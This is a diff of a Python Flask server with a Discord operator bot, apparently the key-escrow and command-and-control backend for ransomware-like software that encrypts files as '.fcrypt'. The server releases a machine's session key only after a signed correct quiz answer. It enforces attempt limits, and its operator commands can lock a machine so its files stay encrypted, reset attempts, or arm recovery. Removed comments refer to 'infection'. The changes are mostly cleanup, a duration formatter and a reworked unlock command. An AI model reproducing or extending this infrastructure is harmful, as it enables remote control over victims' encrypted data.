@@ -1,4 +1,4 @@
-# serverv1.0.0.py
+# serverv1.0.6.py
 #!/usr/bin/env python3
 
 import os
@@ -48,6 +48,7 @@ except Exception as e:
 
 _state_lock = threading.Lock()
 
+
 def _load_state() -> dict:
     if STATE_FILE.exists():
         try:
@@ -55,6 +56,7 @@ def _load_state() -> dict:
         except Exception:
             pass
     return {}
+
 
 def _save_state(state: dict):
     try:
@@ -64,33 +66,32 @@ def _save_state(state: dict):
     except Exception:
         pass
 
+
 STATE = _load_state()
 
+
 def _refresh_state():
-    """v1.0.5 : recharge l'état depuis le disque AVANT toute décision
-    (/poll, /unlock, !list, !unlock) — plus d'état en mémoire stale : le
-    verrou posé par !lock est immédiatement visible partout, même si Flask
-    et le bot tournent dans des workers différents, et un /poll qui écrit
-    son heartbeat n'écrase plus jamais un verrou."""
     with _state_lock:
         fresh = _load_state()
         STATE.clear()
         STATE.update(fresh)
 
+
 def _env_hash(envelope: str) -> str:
     return hashlib.sha256(envelope.encode("utf-8")).hexdigest()
 
+
 def _attempts_of(machine_id: str, env_h: str) -> int:
-    """Max des compteurs machine et enveloppe : usurper un machine_id neuf ne
-    réinitialise rien, changer d'enveloppe non plus."""
     with _state_lock:
         m = STATE.get("m:" + machine_id, {}).get("attempts", 0)
         e = STATE.get("e:" + env_h, {}).get("attempts", 0)
         return max(m, e)
 
+
 def _env_unlocked(env_h: str) -> bool:
     with _state_lock:
         return bool(STATE.get("e:" + env_h, {}).get("unlocked", False))
+
 
 def _record_both(machine_id: str, env_h: str, ok: bool):
     with _state_lock:
@@ -112,6 +113,7 @@ def _record_both(machine_id: str, env_h: str, ok: bool):
             e["unlocked"] = True
         _save_state(STATE)
 
+
 def _is_locked(machine_id: str, env_h: str) -> bool:
     with _state_lock:
         if STATE.get("m:" + machine_id, {}).get("locked"):
@@ -120,28 +122,24 @@ def _is_locked(machine_id: str, env_h: str) -> bool:
             return True
         return False
 
+
 def _env_attempts(env_h: str) -> int:
-    """Tentatives sur CETTE enveloppe uniquement (cap anti-brute-force par
-    enveloppe, indépendant du compteur machine cumulatif)."""
     with _state_lock:
         return STATE.get("e:" + env_h, {}).get("attempts", 0)
 
+
 def _machine_failed(machine_id: str) -> bool:
-    """True si la machine a DÉJÀ une tentative échouée (success=False avec au
-    moins une tentative) — « sans seconde chance ». Une tentative réussie
-    précédente ne bloque PAS une nouvelle enveloppe (nouvelle infection)."""
     with _state_lock:
         m = STATE.get("m:" + machine_id, {})
         return bool(m.get("attempts", 0) > 0 and m.get("success") is False)
 
+
 def _touch_machine(machine_id: str):
-    """Enregistre la présence d'une machine (first_seen) sans incrémenter les
-    tentatives — pour que !list la montre même si /unlock retourne locked_out
-    au gate (avant _record_both)."""
     with _state_lock:
         if STATE.get("m:" + machine_id) is None:
             STATE["m:" + machine_id] = {"attempts": 0, "first_seen": time.time(), "envs": {}}
             _save_state(STATE)
+
 
 def _lock_machine(machine_id: str) -> int:
     with _state_lock:
@@ -169,13 +167,13 @@ def _lock_machine(machine_id: str) -> int:
         _save_state(STATE)
         return n
 
+
 def _client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     return xff.split(",")[0].strip() if xff else (request.remote_addr or "?")
 
+
 def _parse_envelope(envelope_b64: str):
-    """Parse l'enveloppe → (eph_pub, salt, nonce, ct). Aucun déchiffrement ici :
-    le GCM n'est ouvert qu'après TOUTES les vérifications (MAC, réponse)."""
     raw = base64.b64decode(envelope_b64, validate=True)
     if len(raw) < 16 + 32 + 12 + 16:
         raise ValueError("enveloppe trop courte")
@@ -189,9 +187,11 @@ def _parse_envelope(envelope_b64: str):
     eph_pub = X25519PublicKey.from_public_bytes(eph_pub_raw)
     return eph_pub, salt, nonce, ct
 
+
 def _request_key(shared: bytes, salt: bytes) -> bytes:
     return HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                 info=b"request").derive(shared)
+
 
 def _verify_mac(shared: bytes, salt: bytes, machine_id: str, answer: str,
                 nonce: str, ts: str, envelope: str, mac: str) -> bool:
@@ -200,9 +200,8 @@ def _verify_mac(shared: bytes, salt: bytes, machine_id: str, answer: str,
     good = hmac.new(key, msg, hashlib.sha256).hexdigest()
     return hmac.compare_digest(good, mac)
 
+
 def _open_envelope(shared: bytes, salt: bytes, nonce: bytes, ct: bytes) -> bytes:
-    """Déchiffrement authentifié (GCM) de la session_key — appelé en DERNIER,
-    une fois MAC + anti-rejeu + réponse validés."""
     key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=b"envelope").derive(shared)
     session_key = AESGCM(key).decrypt(nonce, ct, salt)
@@ -210,28 +209,24 @@ def _open_envelope(shared: bytes, salt: bytes, nonce: bytes, ct: bytes) -> bytes
         raise ValueError("session_key invalide")
     return session_key
 
+
 def _encrypt_response(session_key: bytes, shared: bytes, salt: bytes):
-    """Chiffre la session_key pour la réponse (clé HKDF distincte,
-    info=b'response') : elle ne circule jamais en clair, même côté logs."""
     key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=b"response").derive(shared)
     nonce = secrets.token_bytes(12)
     ct = AESGCM(key).encrypt(nonce, session_key, None)
     return ct.hex(), nonce.hex()
 
+
 def _poll_mac(shared: bytes, salt: bytes, machine_id: str, nonce: str,
               ts: str, env_h: str) -> str:
-    """MAC attendu sur /poll : clé HKDF info=b'poll' (domaine distinct du
-    MAC /unlock), couvre machine_id, nonce, ts et le hash de l'enveloppe."""
     key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=b"poll").derive(shared)
     msg = "\n".join([machine_id, nonce, ts, env_h]).encode("utf-8")
     return hmac.new(key, msg, hashlib.sha256).hexdigest()
 
+
 def _seen_nonce(machine_id: str, nonce: str) -> bool:
-    """Anti-rejeu /poll : True si le nonce a DÉJÀ été vu (cache purgé de la
-    fenêtre TS_WINDOW). Le MAC étant vérifié AVANT, un faux MAC ne consomme
-    jamais rien."""
     now = time.time()
     with _state_lock:
         k = "n:" + machine_id
@@ -242,16 +237,14 @@ def _seen_nonce(machine_id: str, nonce: str) -> bool:
         _save_state(STATE)
         return replay
 
+
 def _heartbeat_seen(machine_id: str):
-    """Marque la machine « vue » (script ouvert) pour la commande !list."""
     with _state_lock:
         STATE.setdefault("h:" + machine_id, {})['last_seen'] = time.time()
         _save_state(STATE)
 
+
 def _arm_recovery(machine_id: str) -> bool:
-    """Arme le drapeau de récupération d'urgence (one-shot, TTL).
-    Refusé si la machine est verrouillée (!lock). Retourne True si la machine
-    était déjà connue du serveur."""
     with _state_lock:
         if STATE.get("m:" + machine_id, {}).get("locked"):
             return False
@@ -260,10 +253,8 @@ def _arm_recovery(machine_id: str) -> bool:
         _save_state(STATE)
     return known
 
+
 def _take_recovery(machine_id: str):
-    """Consomme le drapeau de récupération (une seule fois) et le renvoie,
-    ou None s'il est absent / déjà consommé / expiré (RECOVERY_TTL) ou si la
-    machine est verrouillée."""
     with _state_lock:
         if STATE.get("m:" + machine_id, {}).get("locked"):
             return None
@@ -279,31 +270,65 @@ def _take_recovery(machine_id: str):
         _save_state(STATE)
         return r
 
+
+def _human_delta(sec) -> str:
+    """Durée humaine : s / min / h / j / sem / mois / an(s)."""
+    sec = max(0, int(sec))
+    if sec < 60:
+        return f"{sec} s"
+    if sec < 3600:
+        m, s = divmod(sec, 60)
+        return f"{m} min {s} s" if s else f"{m} min"
+    if sec < 86400:
+        h, r = divmod(sec, 3600)
+        m = r // 60
+        return f"{h} h {m} min" if m else f"{h} h"
+    if sec < 604800:
+        d, r = divmod(sec, 86400)
+        h = r // 3600
+        return f"{d} j {h} h" if h else f"{d} j"
+    if sec < 2592000:
+        w, r = divmod(sec, 604800)
+        d = r // 86400
+        return f"{w} sem {d} j" if d else f"{w} sem"
+    if sec < 31536000:
+        mo, r = divmod(sec, 2592000)
+        d = r // 86400
+        return f"{mo} mois {d} j" if d else f"{mo} mois"
+    y, r = divmod(sec, 31536000)
+    mo = r // 2592000
+    return f"{y} an(s) {mo} mois" if mo else f"{y} an(s)"
+
+
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.0.6"}), 200
 
+
 @app.route("/", methods=["GET"])
 def root():
-    """Ping racine : navigateur, cron-job.org et health-check Render
-    (HEAD / inclus, géré automatiquement). JSON minuscule, aucun secret."""
     return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.0.6"}), 200
+
 
 @app.errorhandler(404)
 def _not_found(_e):
     return jsonify({"error": "not_found"}), 404
 
+
 @app.errorhandler(405)
 def _method_not_allowed(_e):
     return jsonify({"error": "method_not_allowed"}), 405
+
 
 @app.errorhandler(413)
 def _payload_too_large(_e):
     return jsonify({"error": "payload_too_large"}), 413
 
+
 @app.errorhandler(500)
 def _internal_error(_e):
     return jsonify({"error": "server_error"}), 500
+
 
 @app.route("/unlock", methods=["POST"])
 def unlock():
@@ -332,7 +357,7 @@ def unlock():
 
     env_h = _env_hash(envelope)
 
-    _refresh_state()  # v1.0.5 : décision sur l'état frais du disque
+    _refresh_state()
     if _is_locked(machine_id, env_h) or _env_unlocked(env_h) \
             or _env_attempts(env_h) >= MAX_ATTEMPTS or _machine_failed(machine_id):
         _touch_machine(machine_id)
@@ -388,11 +413,9 @@ def unlock():
         "nonce": nonce_hex,
     }), 200
 
+
 @app.route("/poll", methods=["POST"])
 def poll():
-    """Heartbeat signé du PC (lien opérateur) + remise du grant de
-    récupération d'urgence. Même discipline que /unlock : formats stricts,
-    MAC obligatoire AVANT toute écriture d'état, anti-rejeu par nonce."""
     ip = _client_ip()
     try:
         req = request.get_json(force=True, silent=True) or {}
@@ -414,7 +437,7 @@ def poll():
             or len(envelope) > 22000):
         return jsonify({"status": "error", "reason": "bad_fields"}), 400
 
-    _refresh_state()  # v1.0.5 : le verrou !lock est vu même posé par un autre worker
+    _refresh_state()
     env_h = _env_hash(envelope)
     try:
         eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
@@ -464,15 +487,11 @@ def poll():
     return jsonify({"status": "ok",
                     "recovery": {"session_key_enc": enc_hex, "nonce": nonce_hex}}), 200
 
-# v1.0.5 : le bot Discord NE doit tourner que dans UN SEUL worker gunicorn.
-# Sans ça, chaque worker démarre son propre bot → Discord n'accepte qu'une
-# session par token → les workers se mutually-kickent → le bot ne se
-# connecte jamais (ou reboot en boucle). Verrou fichier exclusif (fcntl) :
-# le 1er worker qui l'obtient lance le bot ; les autres skipent. Si ce
-# worker meurt, le verrou est libéré et un autre reprend.
+
 _BOT_LOCK_FD = None
 _BOT_STATE = {"alive": False, "connected": False, "user": None,
               "error": None, "started_at": 0}
+
 
 def _try_acquire_bot_lock():
     global _BOT_LOCK_FD
@@ -485,12 +504,10 @@ def _try_acquire_bot_lock():
     except Exception:
         return False
 
+
 def _discord_bot_main(token: str):
     _BOT_STATE["alive"] = True
     _BOT_STATE["started_at"] = time.time()
-    # v1.0.5 : logging détaillé — sans ça, les close codes du gateway Discord
-    # (4004 token invalide, 4014 intents non activées, 4013 session dupliquée)
-    # sont avalés silencieusement et le bot « ne connecte jamais » sans erreur.
     import logging
     logging.basicConfig(
         level=logging.INFO,
@@ -512,11 +529,6 @@ def _discord_bot_main(token: str):
           f"python={__import__('sys').version.split()[0]} "
           f"discord.py={discord.__version__} "
           f"admin_ids={DISCORD_ADMIN_IDS}")
-    # v1.0.6 : shim asyncio pour Python 3.13/3.14. Sur ces versions,
-    # asyncio.get_event_loop() ne crée PLUS de loop s'il n'y en a pas dans le
-    # thread → discord.py 2.4/2.5 peut rester coincé au handshake gateway WS
-    # sans lever d'erreur (bot.run tourne, on_ready jamais). On installe donc
-    # explicitement une loop neuve attachée à CE thread avant bot.run.
     import asyncio
     try:
         loop = asyncio.new_event_loop()
@@ -530,8 +542,6 @@ def _discord_bot_main(token: str):
 
     @bot.event
     async def on_connect():
-        # WS ouvert vers le gateway, avant IDENTIFY. Prouve que le token est
-        # accepté au niveau HTTP/WS (sinon on reste bloqué avant ici).
         print(f"[bot] on_connect — WS gateway ouvert, IDENTIFY en cours")
 
     @bot.event
@@ -586,9 +596,9 @@ def _discord_bot_main(token: str):
             "Réservées aux IDs Discord autorisés (`DISCORD_ADMIN_IDS`).",
             fields=[
                 ("!list", "Machines connues : ✅ en ligne / ❌ hors ligne, 🔒 si verrouillée.", False),
-                ("!lock <id>", "Verrouille la machine : `/unlock` renvoie `locked_out` même avec une bonne réponse au QCM ; `!recovery` désactivé ; les `.fcrypt` restent chiffrés.", False),
-                ("!unlock <id>", "Réinitialise la machine : lève le verrou `!lock` ET remet à zéro le compteur de tentatives (machine + enveloppes) — pour re-tester ou accorder une 2ᵉ chance.", False),
-                ("!recovery <id>", "Récupération d'urgence : le PC affiche la progression du déchiffrement en % (refusé si verrouillée).", False),
+                ("!lock <id>", "Verrouille la machine.", False),
+                ("!unlock <id>", "Réinitialise la machine (lève le verrou et reset les tentatives).", False),
+                ("!recovery <id>", "Récupération d'urgence : déclenche le déchiffrement en % sur le PC.", False),
                 ("!help", "Cette aide.", False),
             ],
             footer=f"fcrypt-server · demandé par {ctx.author}"))
@@ -626,7 +636,7 @@ def _discord_bot_main(token: str):
             locked = bool(m.get("locked"))
             if locked:
                 locked_n += 1
-            ago = "jamais vu" if not hs else f"vu il y a {int(now - hs)} s"
+            ago = "jamais vu" if not hs else f"vu il y a {_human_delta(now - hs)}"
             status = "✅ en ligne" if online else "❌ hors ligne"
             if locked:
                 nenv = len(m.get("envs", {}))
@@ -649,21 +659,18 @@ def _discord_bot_main(token: str):
         if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
             await ctx.send(embed=_embed(
                 "Usage", COL_WARN,
-                "`!lock <machine_id>` — verrouille la machine. Même une bonne "
-                "réponse au QCM ne rendra plus la clé de session ; les `.fcrypt` "
-                "déjà chiffrés le restent."))
+                "`!lock <machine_id>` — verrouille la machine."))
             return
         n = _lock_machine(mid)
         note = ("" if n > 0 else
                 " (0 enveloppe = aucun /unlock tenté avant le lock — le verrou "
-                "machine reste TOTAL : /poll renvoie verrouillé et /unlock est bloqué.)")
+                "machine reste TOTAL.)")
         await ctx.send(embed=_embed(
             f"Machine verrouillée — `{mid}`", COL_LOCK,
             f"{n} enveloppe(s) associée(s) gelée(s).{note}",
             fields=[
-                ("/unlock", "Renvoie désormais `locked_out` même si la réponse au QCM est correcte.", False),
-                ("!recovery", "Désactivé pour cette machine.", False),
-                (".fcrypt existants", "Une enveloppe neuve dérive une `session_key` différente, incapable de déchiffrer les fichiers existants.", False),
+                ("/unlock", "Renvoie `locked_out`.", False),
+                ("!recovery", "Désactivé.", False),
             ],
             footer=f"verrouillé par {ctx.author}"))
 
@@ -678,12 +685,33 @@ def _discord_bot_main(token: str):
                 "Usage", COL_WARN,
                 "`!unlock <machine_id>` — retire le verrou posé par `!lock`."))
             return
-        _refresh_state()  # v1.0.5 : reset sur l'état frais du disque
+
+        _refresh_state()
         with _state_lock:
+            known = any((p + mid) in STATE for p in ("h:", "m:", "r:"))
+            if not known:
+                for ek, ev in STATE.items():
+                    if ek[:2] == "e:" and isinstance(ev, dict):
+                        if mid in ev.get("machines", {}):
+                            known = True
+                            break
+            if not known:
+                await ctx.send(embed=_embed(
+                    "Machine inconnue", COL_WARN,
+                    f"`{mid}` n'est pas dans l'état serveur. Vérifie l'id avec `!list`."))
+                return
+
             m = STATE.get("m:" + mid)
             was_locked = bool(m and m.get("locked"))
             reset_envs = 0
-            if m is not None:
+
+            if m is None:
+                STATE["m:" + mid] = {
+                    "attempts": 0, "first_seen": time.time(),
+                    "success": False, "envs": {},
+                }
+                _save_state(STATE)
+            else:
                 m["locked"] = False
                 m.pop("locked_ts", None)
                 m["attempts"] = 0
@@ -698,17 +726,13 @@ def _discord_bot_main(token: str):
                         e["unlocked"] = False
                         reset_envs += 1
                 _save_state(STATE)
-        if m is not None:
-            await ctx.send(embed=_embed(
-                f"Machine réinitialisée — `{mid}`", COL_OK,
-                f"Verrou opérateur levé (était {'ACTIF' if was_locked else 'inactif'}), "
-                f"compteur de tentatives remis à zéro ({reset_envs} enveloppe(s) associée(s)). "
-                f"La machine peut à nouveau tenter un `/unlock`.",
-                footer=f"réinitialisé par {ctx.author}"))
-        else:
-            await ctx.send(embed=_embed(
-                "Machine inconnue", COL_WARN,
-                f"`{mid}` n'est pas dans l'état serveur. Vérifie l'id avec `!list`."))
+
+        await ctx.send(embed=_embed(
+            f"Machine réinitialisée — `{mid}`", COL_OK,
+            f"Verrou opérateur levé (était {'ACTIF' if was_locked else 'inactif'}), "
+            f"compteur de tentatives remis à zéro ({reset_envs} enveloppe(s) associée(s)). "
+            f"La machine peut à nouveau tenter un `/unlock`.",
+            footer=f"réinitialisé par {ctx.author}"))
 
     @bot.command(name="recovery")
     async def _recovery_cmd(ctx, mid: str = ""):
@@ -724,24 +748,19 @@ def _discord_bot_main(token: str):
         if STATE.get("m:" + mid, {}).get("locked"):
             await ctx.send(embed=_embed(
                 f"Récupération refusée — `{mid}`", COL_LOCK,
-                "Cette machine est verrouillée (`!lock`). Annulez d'abord le verrou pour armer une récupération."))
+                "Cette machine est verrouillée (`!lock`). Annulez d'abord le verrou."))
             return
         known = _arm_recovery(mid)
         if known:
             await ctx.send(embed=_embed(
                 f"Récupération armée — `{mid}`", COL_OK,
-                "Le déchiffrement démarrera au prochain poll du PC (≤ ~10 s) ; "
-                "la progression s'affichera en % sur son écran (interface du mini-jeu).",
+                "Le déchiffrement démarrera au prochain poll du PC (≤ ~10 s).",
                 footer=f"armé par {ctx.author}"))
         else:
             await ctx.send(embed=_embed(
                 f"Récupération armée (machine inconnue) — `{mid}`", COL_WARN,
-                "Machine inconnue du serveur — drapeau armé quand même, mais il "
-                "ne sera consommé que si ce PC poll réellement."))
+                "Machine inconnue du serveur — drapeau armé quand même."))
 
-    # Heartbeat de diagnostic : logge l'état toutes les 30s pour qu'on voie
-    # si le bot reste bloqué avant on_connect (token) ou avant on_ready
-    # (intents). Tournant dans le bot thread, n'utilise PAS l'event loop.
     import threading as _th
     def _hb():
         while _BOT_STATE["alive"]:
@@ -767,17 +786,16 @@ def _discord_bot_main(token: str):
         _BOT_STATE["alive"] = False
         print("[bot] bot.run terminé (finally)")
 
+
 if DISCORD_BOT_TOKEN and _try_acquire_bot_lock():
-    # v1.0.5 : un SEUL worker gunicorn lance le bot (verrou exclusif).
     threading.Thread(target=_discord_bot_main, args=(DISCORD_BOT_TOKEN,), daemon=True).start()
     print("[bot] thread Discord démarré (worker détenteur du verrou)")
 elif DISCORD_BOT_TOKEN:
     print("[bot] token présent mais un autre worker a déjà le verrou — bot skipé ici")
 
+
 @app.route("/botstatus")
 def _botstatus():
-    """v1.0.5 : diagnostic — sait si CE worker fait tourner le bot, s'il est
-    connecté, et la dernière erreur (token invalide, intents, etc.)."""
     return jsonify({
         "bot_running_here": _BOT_STATE["alive"],
         "connected": _BOT_STATE["connected"],
@@ -791,7 +809,7 @@ def _botstatus():
         "python": __import__("sys").version.split()[0],
     }), 200
 
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
-
